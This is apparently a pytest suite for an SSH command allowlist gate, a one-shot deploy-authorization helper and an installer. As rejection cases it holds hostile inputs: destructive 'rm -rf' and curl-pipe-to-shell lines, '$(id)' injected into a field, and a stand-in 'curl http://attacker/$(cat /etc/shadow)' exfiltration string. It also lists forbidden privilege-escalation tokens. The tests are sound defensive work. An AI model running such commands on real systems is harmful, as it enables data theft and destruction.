"""Exact-byte tests for the BEAAA-23703 d9 one-shot host-gate candidate.

Run from the candidate directory:

    D9_REPO=<clone holding d9> python3 -m pytest -q tests/test_d9_host_gate.py

The tests load the candidate files themselves, not a copy. Nothing here
installs, arms, or deploys anything: every filesystem effect stays inside
pytest's temporary directories, and the installer is exercised against a fake
host root with os.chown stubbed, never against `/`.
"""

import hashlib
import importlib.machinery
import importlib.util
import json
import os
import pathlib
import stat
import subprocess

import pytest

CANDIDATE = pathlib.Path(__file__).resolve().parent.parent
BUNDLE = CANDIDATE.parent
_PARENTS = pathlib.Path(__file__).resolve().parents
_ENV_REPO = os.environ.get("D9_REPO")
REPO = pathlib.Path(_ENV_REPO) if _ENV_REPO else (_PARENTS[4] if len(_PARENTS) > 4 else _PARENTS[-1])

D9 = "d9d680f53db7de263f026be5284c97229126872c"
D9_TREE = "da7883541fa77ec9712a07c5d4683bcd054c1e91"
A68 = "a68e7e0969b45e7eb8add18ff2007a305a0156aa"
CANONICAL_PREFLIGHT = "e1d50aec40829636e2ab68488c8887d1bd0e796c8aef9b62f2b66a07445f1542"
CANONICAL_GATE = "44ff5dfa0faac3174bc97b0546a51194a16ce2fac40ac15f9da984460d5d323f"


def _load(name, filename):
    loader = importlib.machinery.SourceFileLoader(name, str(CANDIDATE / filename))
    spec = importlib.util.spec_from_loader(name, loader)
    module = importlib.util.module_from_spec(spec)
    loader.exec_module(module)
    return module


gate = _load("d9_gate", "backbond-real-agent-demo-ssh-gate")
helper = _load("d9_preflight", "backbond-real-agent-demo-secret-preflight")
verifier = _load("d9_verifier", "verify_release_manifest.py")
installer = _load("d9_installer", "install_host_gate.py")

GATE_SOURCE = (CANDIDATE / "backbond-real-agent-demo-ssh-gate").read_bytes()
HELPER_SOURCE = (CANDIDATE / "backbond-real-agent-demo-secret-preflight").read_bytes()
INSTALLER_SOURCE = (CANDIDATE / "install_host_gate.py").read_bytes()
MANIFEST = json.loads((CANDIDATE / "MANIFEST.json").read_text())

ROOT = gate.RELEASE_DIR
DEPLOY_OK = (
    "DEMO_GIT_SHA='%s' DEMO_DEPLOYED_AT='2026-08-16T15:04:05Z' "
    "bash '%s/demo-real-agent/deploy.sh' '%s'" % (D9, ROOT, ROOT)
)

GOOD_ENV = (
    "DEMO_ACCESS_TOKEN=redacted-value\n"
    "ARE_BUNDLE_SIGNING_KEY=redacted-value\n"
    "OPENROUTER_API_KEY=redacted-value\n"
)


# ---------------------------------------------------------------------------
# exactly one root action
# ---------------------------------------------------------------------------


def test_manifest_declares_exactly_one_root_action():
    assert MANIFEST["root_actions"]["count"] == 1
    assert MANIFEST["root_actions"]["command"] == (
        "/usr/local/sbin/backbond-real-agent-demo-secret-preflight"
    )
    assert MANIFEST["root_actions"]["arguments"] == "none"


def gate_code_without_docstring():
    """The gate source with its module docstring removed."""
    body = GATE_SOURCE.split(b'"""', 2)
    assert len(body) == 3, "module docstring not found"
    return body[2]


def test_gate_never_elevates():
    """The gate's code must contain no sudo call and no second privileged path."""
    code = gate_code_without_docstring()
    for forbidden in (b"sudo", b"backbond-real-agent-demo-authorize", b"pkexec", b"setuid"):
        assert forbidden not in code


def test_candidate_ships_no_second_helper_and_no_sudoers_file():
    names = {path.name for path in CANDIDATE.iterdir()}
    assert "backbond-real-agent-demo-authorize" not in names
    assert not any(name.endswith(".sudoers") for name in names)
    assert not any(name.startswith("sudoers-") for name in names)
    installed = {entry["target"] for entry in MANIFEST["install"]}
    assert installed == {
        "/usr/local/sbin/backbond-real-agent-demo-ssh-gate",
        "/usr/local/sbin/backbond-real-agent-demo-secret-preflight",
    }
    assert not any("sudoers.d" in target for target in installed)


def test_existing_sudoers_rule_is_pinned_unchanged():
    unchanged = {entry["path"]: entry["sha256"] for entry in MANIFEST["must_not_change"]}
    assert "/etc/sudoers.d/backbond-real-agent-demo-secret-preflight" in unchanged


# ---------------------------------------------------------------------------
# allowlist
# ---------------------------------------------------------------------------


def test_release_directory_is_pinned_to_d9():
    assert ROOT == "/opt/backbond-real-agent-demo/releases/" + D9
    assert gate.SHA == D9


def test_exact_mkdir_is_permitted():
    assert gate.resolve("mkdir -p " + ROOT) == ("mkdir", None)


def test_exact_extract_is_permitted():
    assert gate.resolve("cd %s && tar -xzf real-agent-demo-release.tgz" % ROOT) == ("extract", None)


def test_exact_deploy_is_permitted():
    assert gate.resolve(DEPLOY_OK) == ("deploy", "2026-08-16T15:04:05Z")


@pytest.mark.parametrize("command", sorted(gate.SFTP_SUBSYSTEM_SHAPES))
def test_sftp_subsystem_shapes_reach_the_confined_sink(command):
    assert gate.resolve(command) == ("sftp-sink", None)


@pytest.mark.parametrize("command", sorted(gate.SCP_SINK_SHAPES))
def test_legacy_scp_sink_shapes_reach_the_confined_sink(command):
    assert gate.resolve(command) == ("scp-sink", None)


@pytest.mark.parametrize(
    "command", ["/usr/lib/openssh/sftp-server ", "internal-sftp ", "sftp-server  "]
)
def test_subsystem_trailing_space_is_accepted(command):
    """sshd appends a space to a Subsystem line that carries no arguments."""
    assert gate.resolve(command) == ("sftp-sink", None)


@pytest.mark.parametrize(
    "command",
    [
        "",
        "mkdir -p /opt/backbond-real-agent-demo/releases/" + A68,
        "cd /opt/backbond-real-agent-demo/releases/%s && tar -xzf real-agent-demo-release.tgz" % A68,
        "scp -t /opt/backbond-real-agent-demo/releases/%s/" % A68,
        "mkdir -p /opt/backbond-real-agent-demo/releases/" + "0" * 40,
        "mkdir -p " + ROOT + " /tmp/extra",
        "mkdir -p " + ROOT + "; rm -rf /opt/backbond-real-agent-demo",
        "mkdir -p " + ROOT + " && whoami",
        "mkdir -p " + ROOT + "/..",
        "mkdir -p " + ROOT + "\n",
        " mkdir -p " + ROOT,
        "mkdir -p " + ROOT + " ",
        "cd %s && tar -xzf other.tgz" % ROOT,
        "cd %s && tar -xzf real-agent-demo-release.tgz --to-command=sh" % ROOT,
        "cd %s && tar -xzf real-agent-demo-release.tgz && curl http://x" % ROOT,
        "tar -xzf %s/real-agent-demo-release.tgz" % ROOT,
        "scp -t /tmp",
        "scp -f %s/real-agent-demo-release.tgz" % ROOT,
        "scp -t -r " + ROOT + "/",
        "/usr/lib/openssh/sftp-server -f AUTH -l INFO",
        "/usr/lib/openssh/sftp-server -R",
        "bash",
        "sh -c 'id'",
        "whoami",
        "sudo -n /usr/local/sbin/backbond-real-agent-demo-secret-preflight",
    ],
)
def test_denied_commands(command):
    with pytest.raises(gate.Rejected):
        gate.resolve(command)


@pytest.mark.parametrize(
    "command",
    [
        DEPLOY_OK.replace(D9, A68),
        DEPLOY_OK.replace(
            "bash '%s/demo" % ROOT,
            "bash '/opt/backbond-real-agent-demo/releases/%s/demo" % A68,
        ),
        DEPLOY_OK.replace("2026-08-16T15:04:05Z", "$(id)"),
        DEPLOY_OK.replace("2026-08-16T15:04:05Z", "2026-08-16T15:04:05"),
        DEPLOY_OK.replace("2026-08-16T15:04:05Z", ""),
        DEPLOY_OK.replace("2026-08-16T15:04:05Z", "2026-08-16T15:04:05Z' EXTRA='1"),
        DEPLOY_OK.replace("bash '", "sh '"),
        DEPLOY_OK.replace("deploy.sh", "install_claude_judge_proxy.sh"),
        DEPLOY_OK.replace("deploy.sh", "../../../etc/backbond/deploy.sh"),
        DEPLOY_OK + " --force",
        DEPLOY_OK + "; whoami",
        "DEMO_GIT_SHA='%s' bash '%s/demo-real-agent/deploy.sh' '%s'" % (D9, ROOT, ROOT),
        "PATH=/tmp " + DEPLOY_OK,
    ],
)
def test_denied_deploy_variants(command):
    with pytest.raises(gate.Rejected):
        gate.resolve(command)


def test_gate_refuses_to_run_as_root(monkeypatch):
    monkeypatch.setattr(os, "geteuid", lambda: 0)
    monkeypatch.setattr(os, "getegid", lambda: 0)
    with pytest.raises(SystemExit):
        gate.require_unprivileged()


def test_denial_does_not_echo_client_text(capsys):
    with pytest.raises(SystemExit) as excinfo:
        gate.deny("command is not allowlisted", "curl http://attacker/$(cat /etc/shadow)")
    assert excinfo.value.code == 1
    err = capsys.readouterr().err
    assert "attacker" not in err and "shadow" not in err
    assert hashlib.sha256(b"curl http://attacker/$(cat /etc/shadow)").hexdigest() in err


# ---------------------------------------------------------------------------
# the release must be the pinned d9 tree
# ---------------------------------------------------------------------------


def build_release(tmp_path):
    root = tmp_path / "release"
    (root / "demo-real-agent").mkdir(parents=True)
    (root / "api").mkdir()
    (root / "demo-real-agent" / "deploy.sh").write_text("#!/usr/bin/env bash\necho deploy\n")
    (root / "api" / "app.py").write_text("print('app')\n")
    os.chmod(root / "demo-real-agent" / "deploy.sh", 0o755)
    (root / "real-agent-demo-release.tgz").write_bytes(b"archive bytes are not part of the tree")
    return root


def pin_release(monkeypatch, root):
    count, digest = verifier.tree_digest(root)
    monkeypatch.setattr(gate, "RELEASE_DIR", str(root))
    monkeypatch.setattr(gate, "DEPLOY_SCRIPT", str(root / "demo-real-agent" / "deploy.sh"))
    monkeypatch.setattr(gate, "EXPECTED_FILES", count)
    monkeypatch.setattr(gate, "EXPECTED_TREE_SHA256", digest)
    return count, digest


def test_matching_release_passes(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    count, digest = pin_release(monkeypatch, root)
    assert gate.verify_pinned_tree() == (count, digest)


def test_archive_is_excluded_from_the_pin(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    (root / "real-agent-demo-release.tgz").write_bytes(b"a completely different archive")
    gate.verify_pinned_tree()


@pytest.mark.parametrize(
    "tamper",
    [
        lambda root: (root / "api" / "backdoor.py").write_text("import os\n"),
        lambda root: (root / "api" / "app.py").write_text("print('app') # tampered\n"),
        lambda root: os.unlink(root / "api" / "app.py"),
        lambda root: (root / "demo-real-agent" / "deploy.sh").write_text("curl http://x | sh\n"),
    ],
)
def test_tampered_release_is_rejected(monkeypatch, tmp_path, tamper):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    tamper(root)
    with pytest.raises(gate.Rejected):
        gate.verify_pinned_tree()


def test_symlinked_file_changes_the_digest(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    os.unlink(root / "api" / "app.py")
    os.symlink("/etc/passwd", root / "api" / "app.py")
    with pytest.raises(gate.Rejected):
        gate.verify_pinned_tree()


def test_symlinked_directory_changes_the_digest(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    outside = tmp_path / "outside"
    (outside / "nested").mkdir(parents=True)
    (outside / "nested" / "payload.py").write_text("payload\n")
    os.symlink(str(outside), root / "extra")
    with pytest.raises(gate.Rejected):
        gate.verify_pinned_tree()


def test_pinned_digest_is_exactly_the_d9_tree_in_git():
    head = subprocess.run(
        ["git", "-C", str(REPO), "rev-parse", D9 + "^{tree}"], capture_output=True, text=True
    )
    if head.returncode != 0:
        pytest.skip("commit %s is not present in %s" % (D9, REPO))
    assert head.stdout.strip() == D9_TREE
    count, digest = verifier.from_git(REPO)
    assert (count, digest) == (gate.EXPECTED_FILES, gate.EXPECTED_TREE_SHA256)
    assert (count, digest) == (
        MANIFEST["release"]["release_files"],
        MANIFEST["release"]["release_tree_sha256"],
    )


def test_verifier_and_gate_agree_on_the_pin():
    assert verifier.EXPECTED_FILES == gate.EXPECTED_FILES
    assert verifier.EXPECTED_TREE_SHA256 == gate.EXPECTED_TREE_SHA256


# ---------------------------------------------------------------------------
# the deploy leg execs unprivileged and never elevates
# ---------------------------------------------------------------------------


def test_deploy_verifies_then_execs_unprivileged(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    calls = []
    monkeypatch.setattr(gate.subprocess, "run", lambda *a, **k: calls.append(a))
    execs = []
    monkeypatch.setattr(os, "execve", lambda *a: execs.append(a))

    gate.do_deploy("2026-08-16T15:04:05Z")

    assert calls == []          # no subprocess at all, so no sudo
    path, argv, env = execs[0]
    assert path == "/bin/bash"
    assert argv == ["/bin/bash", str(root / "demo-real-agent" / "deploy.sh"), str(root)]
    assert env["DEMO_GIT_SHA"] == D9
    assert env["DEMO_DEPLOYED_AT"] == "2026-08-16T15:04:05Z"
    assert set(env) == {"PATH", "HOME", "USER", "LOGNAME", "DEMO_GIT_SHA", "DEMO_DEPLOYED_AT"}
    assert env["PATH"] == "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"


def test_a_tampered_release_never_reaches_exec(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    (root / "api" / "backdoor.py").write_text("import os\n")
    execs = []
    monkeypatch.setattr(os, "execve", lambda *a: execs.append(a))
    with pytest.raises(gate.Rejected):
        gate.do_deploy("2026-08-16T15:04:05Z")
    assert execs == []


def test_absent_deploy_script_is_rejected(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    os.unlink(root / "demo-real-agent" / "deploy.sh")
    with pytest.raises(gate.Rejected):
        gate.do_deploy("2026-08-16T15:04:05Z")


def test_symlinked_deploy_script_is_rejected(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    script = root / "demo-real-agent" / "deploy.sh"
    os.unlink(script)
    os.symlink("/bin/sh", script)
    with pytest.raises(gate.Rejected):
        gate.do_deploy("2026-08-16T15:04:05Z")


# ---------------------------------------------------------------------------
# the single root helper: unchanged preflight, plus one-shot consumption
# ---------------------------------------------------------------------------


def test_preflight_logic_is_byte_identical_to_canonical_d9():
    """Only the docstring differs; every canonical code path is untouched."""
    canonical = subprocess.run(
        ["git", "-C", str(REPO), "cat-file", "blob",
         D9 + ":demo-real-agent/host/real_agent_demo_secret_preflight.py"],
        capture_output=True,
    )
    if canonical.returncode != 0:
        pytest.skip("commit %s is not present in %s" % (D9, REPO))
    assert hashlib.sha256(canonical.stdout).hexdigest() == CANONICAL_PREFLIGHT
    original = canonical.stdout.decode().splitlines()
    enhanced = HELPER_SOURCE.decode().splitlines()
    removed = [line for line in original if line not in enhanced]
    assert removed == ['"""Validate the fixed passive-demo secret file without disclosing values."""']


@pytest.fixture
def env_file(tmp_path, monkeypatch):
    path = tmp_path / "real-agent-demo.env"
    path.write_text(GOOD_ENV)
    os.chmod(path, 0o600)
    monkeypatch.setattr(helper, "EXPECTED_UID", os.getuid())
    monkeypatch.setattr(helper, "EXPECTED_GID", os.getgid())
    return path


@pytest.fixture
def armed(tmp_path, monkeypatch):
    state = tmp_path / "backbond"
    state.mkdir(mode=0o700)
    allow = state / "real-agent-demo-deploy.allow"
    allow.write_text(D9 + "\n")
    os.chmod(allow, 0o600)
    monkeypatch.setattr(helper, "AUTH_UID", os.getuid())
    monkeypatch.setattr(helper, "AUTH_GID", os.getgid())
    monkeypatch.setattr(os, "geteuid", lambda: 0)
    return state, allow, state / "real-agent-demo-deploy.consumed"


def consume(state, allow, consumed):
    return helper.consume_authorization(state, allow, consumed)


def test_names_only_preflight_still_reports_configured_names(env_file):
    assert helper.validate(env_file) == [
        "DEMO_ACCESS_TOKEN", "ARE_BUNDLE_SIGNING_KEY", "OPENROUTER_API_KEY"
    ]


def test_preflight_reports_the_judge_proxy_line_deploy_sh_greps_for(env_file):
    env_file.write_text(
        "DEMO_ACCESS_TOKEN=v\nARE_BUNDLE_SIGNING_KEY=v\n"
        "DEMO_JUDGE_BACKEND=claude-code-proxy\nCLAUDE_JUDGE_PROXY_TOKEN=v\n"
    )
    os.chmod(env_file, 0o600)
    assert "DEMO_JUDGE_BACKEND" in helper.validate(env_file)


def test_preflight_never_returns_a_value(env_file):
    for name in helper.validate(env_file):
        assert "redacted-value" not in name


@pytest.mark.parametrize(
    "content,reason",
    [
        ("ARE_BUNDLE_SIGNING_KEY=v\n", "DEMO_ACCESS_TOKEN: missing_or_empty"),
        ("DEMO_ACCESS_TOKEN=v\n", "ARE_BUNDLE_SIGNING_KEY: missing_or_empty"),
        ("DEMO_ACCESS_TOKEN=v\nARE_BUNDLE_SIGNING_KEY=v\n", "judge_configuration: missing_or_invalid"),
    ],
)
def test_preflight_failures_are_unchanged(env_file, content, reason):
    env_file.write_text(content)
    os.chmod(env_file, 0o600)
    with pytest.raises(helper.PreflightError) as excinfo:
        helper.validate(env_file)
    assert excinfo.value.args[0] == reason


def test_authorization_is_consumed_exactly_once(armed):
    state, allow, consumed = armed
    assert consume(state, allow, consumed) == D9
    assert not allow.exists() and consumed.exists()
    with pytest.raises(helper.PreflightError) as excinfo:
        consume(state, allow, consumed)
    assert excinfo.value.args[0] == "deploy_authorization: absent"


def test_consumption_is_a_same_directory_rename(armed):
    state, allow, consumed = armed
    assert os.path.dirname(str(helper.ALLOW_PATH)) == os.path.dirname(str(helper.CONSUMED_PATH))
    before = allow.stat().st_ino
    consume(state, allow, consumed)
    assert consumed.stat().st_ino == before


def test_wrong_release_is_refused_and_left_in_place(armed):
    state, allow, consumed = armed
    allow.write_text(A68 + "\n")
    os.chmod(allow, 0o600)
    with pytest.raises(helper.PreflightError) as excinfo:
        consume(state, allow, consumed)
    assert excinfo.value.args[0] == "deploy_authorization: wrong_release"
    assert allow.exists() and not consumed.exists()


@pytest.mark.parametrize(
    "content,reason",
    [
        ("", "wrong_release"),
        (D9[:-1] + "0\n", "wrong_release"),
        (D9.upper() + "\n", "wrong_release"),
        (D9 + " " + A68 + "\n", "wrong_release"),
        ("x" * 200, "oversized"),
    ],
)
def test_authorization_content_must_be_exactly_d9(armed, content, reason):
    state, allow, consumed = armed
    allow.write_text(content)
    os.chmod(allow, 0o600)
    with pytest.raises(helper.PreflightError) as excinfo:
        consume(state, allow, consumed)
    assert excinfo.value.args[0] == "deploy_authorization: " + reason
    assert allow.exists()


@pytest.mark.parametrize("mode", [0o644, 0o660, 0o666, 0o700])
def test_authorization_mode_must_be_0600(armed, mode):
    state, allow, consumed = armed
    os.chmod(allow, mode)
    with pytest.raises(helper.PreflightError) as excinfo:
        consume(state, allow, consumed)
    assert excinfo.value.args[0] == "deploy_authorization: wrong_mode"


def test_authorization_owner_must_be_root(armed, monkeypatch):
    state, allow, consumed = armed
    monkeypatch.setattr(helper, "AUTH_UID", os.getuid() + 1)
    with pytest.raises(helper.PreflightError) as excinfo:
        helper._read_authorization(allow)
    assert excinfo.value.args[0] == "deploy_authorization: wrong_owner"
    assert allow.exists()


def test_symlinked_authorization_is_refused(armed, tmp_path):
    state, allow, consumed = armed
    target = tmp_path / "elsewhere"
    target.write_text(D9 + "\n")
    os.chmod(target, 0o600)
    os.unlink(allow)
    os.symlink(str(target), allow)
    with pytest.raises(helper.PreflightError) as excinfo:
        consume(state, allow, consumed)
    assert excinfo.value.args[0] == "deploy_authorization: not_regular"


def test_fifo_authorization_is_refused(armed):
    state, allow, consumed = armed
    os.unlink(allow)
    os.mkfifo(allow, 0o600)
    with pytest.raises(helper.PreflightError) as excinfo:
        consume(state, allow, consumed)
    assert excinfo.value.args[0] == "deploy_authorization: not_regular"


@pytest.mark.parametrize(
    "field,reason",
    [
        ("uid", "opened_wrong_owner"),
        ("gid", "opened_wrong_owner"),
        ("mode", "opened_wrong_mode"),
        ("type", "opened_not_regular"),
        ("ino", "changed_during_check"),
    ],
)
def test_opened_descriptor_is_revalidated(armed, monkeypatch, field, reason):
    """A same-inode metadata race after the lstat must fail closed."""
    state, allow, consumed = armed
    real_fstat = os.fstat

    class Faked(object):
        def __init__(self, base):
            self._base = base

        def __getattr__(self, name):
            return getattr(self._base, name)

    def fake_fstat(fd):
        base = real_fstat(fd)
        faked = Faked(base)
        if field == "uid":
            faked.st_uid = base.st_uid + 1
        elif field == "gid":
            faked.st_gid = base.st_gid + 1
        elif field == "mode":
            faked.st_mode = stat.S_IFREG | 0o644
        elif field == "type":
            faked.st_mode = stat.S_IFIFO | 0o600
        elif field == "ino":
            faked.st_ino = base.st_ino + 1
        return faked

    monkeypatch.setattr(os, "fstat", fake_fstat)
    with pytest.raises(helper.PreflightError) as excinfo:
        consume(state, allow, consumed)
    assert excinfo.value.args[0] == "deploy_authorization: " + reason
    assert allow.exists()


def test_state_directory_must_not_be_writable(armed):
    state, allow, consumed = armed
    os.chmod(state, 0o777)
    try:
        with pytest.raises(helper.PreflightError) as excinfo:
            consume(state, allow, consumed)
        assert excinfo.value.args[0] == "deploy_authorization: state_dir_writable"
    finally:
        os.chmod(state, 0o700)


def test_helper_requires_root_to_consume(armed, monkeypatch):
    state, allow, consumed = armed
    monkeypatch.setattr(os, "geteuid", lambda: 1002)
    with pytest.raises(helper.PreflightError) as excinfo:
        consume(state, allow, consumed)
    assert excinfo.value.args[0] == "deploy_authorization: not_root"
    assert allow.exists()


def test_helper_rejects_every_argument():
    for argv in ([""], ["/etc/passwd"], [D9], ["--consume"]):
        assert helper.main(argv) == 2


def test_helper_reports_preflight_before_it_consumes(monkeypatch, capsys):
    """An unarmed verification still shows the secret boundary result."""
    monkeypatch.setattr(helper, "validate", lambda: ["DEMO_ACCESS_TOKEN"])
    monkeypatch.setattr(
        helper, "consume_authorization",
        lambda: (_ for _ in ()).throw(helper.PreflightError("deploy_authorization: absent")),
    )
    assert helper.main([]) == 1
    captured = capsys.readouterr()
    assert "secret_file: valid" in captured.out
    assert "DEMO_ACCESS_TOKEN: configured" in captured.out
    assert "deploy_authorization: absent" in captured.err


def test_helper_success_line_names_the_pinned_release(monkeypatch, capsys):
    monkeypatch.setattr(helper, "validate", lambda: ["DEMO_ACCESS_TOKEN"])
    monkeypatch.setattr(helper, "consume_authorization", lambda: D9)
    assert helper.main([]) == 0
    assert "deploy_authorization: consumed %s" % D9 in capsys.readouterr().out


# ---------------------------------------------------------------------------
# installer: verified backup, same-directory atomic replacement, rollback
# ---------------------------------------------------------------------------


def rehearsal_manifest():
    """MANIFEST with the target ownership a rootless rehearsal can produce."""
    manifest = json.loads(json.dumps(MANIFEST))
    for entry in manifest["install"]:
        entry["owner_uid"] = os.getuid()
        entry["owner_gid"] = os.getgid()
    return manifest


@pytest.fixture
def fake_host(tmp_path, monkeypatch):
    """A host root holding the exact bytes this candidate expects to replace."""
    monkeypatch.setattr(installer.os, "chown", lambda *a, **k: None)
    monkeypatch.setattr(installer, "CANDIDATE_DIR", CANDIDATE)
    root = tmp_path / "host"
    (root / "usr/local/sbin").mkdir(parents=True)
    (root / "etc/sudoers.d").mkdir(parents=True)

    canonical = subprocess.run(
        ["git", "-C", str(REPO), "cat-file", "blob",
         D9 + ":demo-real-agent/host/real_agent_demo_secret_preflight.py"],
        capture_output=True,
    )
    if canonical.returncode != 0:
        pytest.skip("commit %s is not present in %s" % (D9, REPO))
    preflight = root / "usr/local/sbin/backbond-real-agent-demo-secret-preflight"
    preflight.write_bytes(canonical.stdout)
    os.chmod(preflight, 0o755)

    sudoers = root / "etc/sudoers.d/backbond-real-agent-demo-secret-preflight"
    sudoers.write_bytes(
        subprocess.run(
            ["git", "-C", str(REPO), "cat-file", "blob",
             D9 + ":demo-real-agent/host/backbond-real-agent-demo-secret-preflight.sudoers"],
            capture_output=True, check=True,
        ).stdout
    )
    return root


def test_installer_replaces_the_existing_helper_with_backup(fake_host, tmp_path):
    """The complaint that installation refuses an existing helper, tested."""
    gate_target = fake_host / "usr/local/sbin/backbond-real-agent-demo-ssh-gate"
    gate_target.write_bytes(b"stale a68 gate bytes\n")

    manifest = rehearsal_manifest()
    manifest["install"][0]["replaces_sha256"] = hashlib.sha256(b"stale a68 gate bytes\n").hexdigest()

    steps = installer.plan(manifest, fake_host)
    actions = {pathlib.Path(step["target"]).name: step["action"] for step in steps}
    assert actions["backbond-real-agent-demo-secret-preflight"] == "replace"
    assert actions["backbond-real-agent-demo-ssh-gate"] == "replace"

    backups = tmp_path / "backups"
    receipt = {}
    installer.install(steps, backups, receipt, system_validation=False)

    installed = fake_host / "usr/local/sbin/backbond-real-agent-demo-secret-preflight"
    assert installer.sha256_file(installed) == MANIFEST["install"][1]["source_sha256"]
    saved = backups / "backbond-real-agent-demo-secret-preflight"
    assert installer.sha256_file(saved) == CANONICAL_PREFLIGHT
    assert oct(stat.S_IMODE(installed.lstat().st_mode)) == "0o755"

    # rollback restores the canonical bytes the board requires us to keep
    installer.rollback(backups, manifest, fake_host, receipt)
    assert installer.sha256_file(installed) == CANONICAL_PREFLIGHT


def test_installer_fails_closed_on_unexpected_current_bytes(fake_host):
    target = fake_host / "usr/local/sbin/backbond-real-agent-demo-secret-preflight"
    target.write_bytes(b"not the canonical helper\n")
    with pytest.raises(installer.InstallError):
        installer.plan(MANIFEST, fake_host)


def test_installer_refuses_to_run_while_armed(fake_host):
    arm = fake_host / "etc/backbond/real-agent-demo-deploy.allow"
    arm.parent.mkdir(parents=True, exist_ok=True)
    arm.write_text(D9 + "\n")
    with pytest.raises(installer.InstallError) as excinfo:
        installer.check_preconditions(MANIFEST, fake_host)
    assert "armed" in str(excinfo.value)


def test_installer_verifies_the_unchanged_sudoers_rule(fake_host):
    installer.check_preconditions(MANIFEST, fake_host)
    (fake_host / "etc/sudoers.d/backbond-real-agent-demo-secret-preflight").write_text("tampered\n")
    with pytest.raises(installer.InstallError):
        installer.check_preconditions(MANIFEST, fake_host)


def test_installer_never_arms(fake_host, tmp_path):
    steps = installer.plan(rehearsal_manifest(), fake_host)
    installer.install(steps, tmp_path / "backups", {}, system_validation=False)
    assert not (fake_host / "etc/backbond/real-agent-demo-deploy.allow").exists()


def test_installer_only_runs_fixed_validators(tmp_path):
    with pytest.raises(installer.InstallError):
        installer.validate_with("/bin/sh -c", tmp_path)


def test_installer_executes_no_repository_content():
    for forbidden in (b"deploy.sh", b"os.system", b"shell=True", b"os.execv"):
        assert forbidden not in INSTALLER_SOURCE


# ---------------------------------------------------------------------------
# static properties of the candidate bytes
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("source", [GATE_SOURCE, HELPER_SOURCE, INSTALLER_SOURCE])
def test_fixed_interpreter_without_path_resolution(source):
    assert source.split(b"\n", 1)[0] == b"#!/usr/bin/python3"


@pytest.mark.parametrize("source", [GATE_SOURCE, HELPER_SOURCE])
def test_no_shell_evaluation_of_client_input(source):
    for forbidden in (b"shell=True", b"os.system", b"os.popen", b"eval(", b"/bin/sh"):
        assert forbidden not in source


@pytest.mark.parametrize("source", [GATE_SOURCE, HELPER_SOURCE, INSTALLER_SOURCE])
def test_no_stale_a68_authority_in_the_candidate(source):
    assert A68.encode() not in source


@pytest.mark.parametrize("source", [GATE_SOURCE, HELPER_SOURCE])
def test_both_programs_are_pinned_to_d9(source):
    assert D9.encode() in source


def test_manifest_removes_the_stale_a68_authority():
    removed = {entry["target"]: entry["expected_sha256"] for entry in MANIFEST["remove"]}
    assert removed["/etc/sudoers.d/backbond-real-agent-demo"] == (
        "37b24501a7470ba37e2002d6f0a219c3b2222f82a6ca559fd71c3cefc73c02bf"
    )
    assert removed["/usr/local/sbin/backbond-real-agent-demo-deploy"] == (
        "956065275defd2abcc95a7d2e14d8e70ee54c10aa799578aa00602f29c9af723"
    )


def test_manifest_rollback_restores_the_canonical_helper():
    assert any(CANONICAL_PREFLIGHT in step for step in MANIFEST["rollback"])


def test_manifest_source_hashes_match_the_shipped_bytes():
    for entry in MANIFEST["install"]:
        actual = hashlib.sha256((CANDIDATE / entry["source"]).read_bytes()).hexdigest()
        assert actual == entry["source_sha256"], entry["source"]


def test_recorded_hashes_recompute():
    lines = (BUNDLE / "SHA256SUMS").read_text().splitlines()
    assert lines, "SHA256SUMS is empty"
    for line in lines:
        digest, name = line.split(None, 1)
        name = name.lstrip("*").strip()
        assert hashlib.sha256((BUNDLE / name).read_bytes()).hexdigest() == digest, name


def test_bundle_ships_no_generated_caches():
    shipped = [line.split(None, 1)[1].strip() for line in (BUNDLE / "SHA256SUMS").read_text().splitlines()]
    for name in shipped:
        assert "__pycache__" not in name
        assert not name.endswith(".pyc")
